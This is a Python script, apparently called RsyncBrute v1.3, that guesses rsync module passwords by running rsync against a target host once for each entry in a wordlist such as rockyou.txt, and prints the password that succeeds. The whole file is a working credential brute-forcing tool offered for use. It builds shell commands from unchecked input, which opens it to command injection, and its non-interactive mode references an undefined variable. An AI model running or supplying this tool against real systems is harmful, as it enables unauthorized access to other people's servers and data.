#!/usr/bin/python3
import os
import sys
import codecs

def show_help():
  print("RsyncBrute v1.3")
  print("OPTIONS:")
  print("  -4/-6 Use IPv4 / IPv6 address")
  print("  -w    Wordlist path")
  print("  -i    Interactive mode")
  print("  -h	 Show this help")
  print("EXAMPLES:")
  print("python3 rsyncBrute.py -4 bender@10.10.10.111:873/module -w /usr/share/wordlists/rockyou.txt")
  print("python3 rsyncBrute.py -6 bender@[dead:beef::250:56ff:febd:3af3]:873/module -w /usr/share/wordlists/rockyou.txt")
  print("python3 rsyncBrute.py -i")
  exit()

def interactive():
  print("RsyncBrute v1.3")
  version = input("Target IPv4 or IPv6? (4/6): ")
  ip = input("Target IP: ")
  port = input("Target port: ")
  user = input("Username: ")
  wordlist = input("Wordlist: ")
  module = input("Module: ")
  ip = "["+ip+"]" if int(version) == 6 else ip
  wl = codecs.open(wordlist,'r',encoding="latin_1")
  pswd = wl.readlines()
  count = 0
  command = "rsync rsync://"+str(user)+"@"+str(ip)+":"+str(port)+"/"+str(module)+" >/dev/null"
  for line in open(wordlist):
    os.system("clear")
    print("RsyncBrute v1.3")
    passwd = pswd[count].strip("\n")
    print("Trying with password: ",passwd)
    os.environ['RSYNC_PASSWORD'] = passwd
    code = os.system(command)
    if (code == 0):
      print("Password is",passwd)
      exit()
    else:
      count += 1

def normal():
  for arg in range(1,num_args,2):
    if (sys.argv[arg] == "-4"):
      command = sys.argv[arg + 1]
    elif (sys.argv[arg] == "-6"):
      command = sys.argv[arg + 1]
    elif (sys.argv[arg] == "-w"):
      wordlist = sys.argv[arg + 1]
    else:
      show_help()
  wl = codecs.open(wordlist,'r',encoding="latin_1")
  pswd = wl.readlines()
  count = 0
  command = "rsync rsync://"+command+" >/dev/null"
  for line in open(wordlist):
    os.system("clear")
    print("RsyncBrute v1.3")
    passwd = pswd[count].strip("\n")
    print("  Trying with password:",passwd)
    os.environ['RSYNC_PASSWORD'] = passwd
    code = os.system(command)
    if (code == 0):
      print("Password is",passwd)
      exit()
    else:
      count += 1

def main():
  num_args = (len(sys.argv) - 1)
  if (num_args == 1 and sys.argv[1] == "-i"):
    interactive()
  elif (num_args != 4):
    show_help()
  else:
    normal()

main()
